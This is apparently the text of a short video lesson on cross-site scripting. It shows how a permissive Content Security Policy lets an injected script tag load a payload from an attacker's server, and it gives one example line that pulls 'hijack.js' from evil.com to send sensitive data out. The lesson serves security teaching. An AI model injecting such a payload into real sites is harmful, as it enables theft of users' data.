[Video link](https://egghead.io/lessons/node-js-read-document-content-from-a-vulnerable-website-via-script-tag-injection-in-an-xss-payload)

# Read Document Content from a Vulnerable Website via Script Tag Injection in an XSS Payload

Now, to put our attacker hat back on!

We can see from the CSP that we allow scripts to be run over https.

If we save our payload on our server as `hijack.js`, this will make it accessible to other sites.

Now, in our message box if we send script tags to request the payload over https, then our malicious script will run and send sensitive data to our server.

```html
<script src="https://evil.com:666/hijack.js"></script>
```

This technique is known as remote script inclusion.
